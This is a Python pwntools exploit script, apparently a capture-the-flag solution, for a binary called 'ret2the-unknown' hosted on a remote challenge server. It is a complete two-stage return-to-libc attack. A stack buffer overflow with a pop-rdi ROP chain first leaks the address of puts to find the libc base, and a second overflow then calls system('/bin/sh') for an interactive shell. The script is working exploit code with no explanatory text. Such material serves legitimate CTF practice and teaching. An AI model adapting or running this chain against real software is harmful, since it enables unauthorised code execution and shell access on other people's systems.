from pwn import *

#Settings
filename = "./ret2the-unknown"
remoteOn = True
junk = b"A"*40

def send(payload):
    r.sendlineafter("where is this place? can you help me get there safely?\n", payload)

def start(elf, ssh=False, libc="./libc-2.28.so"):
    if remoteOn:
        if ssh:
            s = ssh(host="", user="", password="")
            return [s.process(), libc]
        else:
            return [remote("mc.ax", 31568), libc]
    else:
        return [elf.process(), '/lib/x86_64-linux-gnu/libc.so.6']


#Start the processes.
elf = ELF(filename)
r = start(elf)[0]
if start(elf)[1] is not None:
    libc = ELF(start(elf)[1])
rop = ROP(elf)

#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")


#STAGE 1.
log.success("Beginning STAGE 1.")
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_main = elf.symbols["main"]
log.info(f"got_puts @ {hex(got_puts)}")
log.info(f"plt_puts @ {hex(plt_puts)}")
log.info(f"plt_main @ {hex(plt_main)}")

payload = junk
#payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(plt_main)

send(payload)
r.recvline()
r.recvline()
r.recvline()
leak = u64(r.recvline()[:8].strip().ljust(8, b"\x00"))
log.info(f"leaked puts address @ {hex(leak)}")
libc.address = leak - libc.symbols["puts"]
log.info(f"LIBC Base address @ {hex(libc.address)}")
#STAGE 2.
print()
log.success("Beginning STAGE 2.")
bin_sh = next(libc.search(b"/bin/sh")) # Libc /bin/sh address
system = libc.symbols["system"] # libc system address
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"system @ {hex(system)}")

#Crafting the final payload
payload = junk
payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

#Sending the payload
log.success("Sending the payload")
send(payload)
r.interactive()
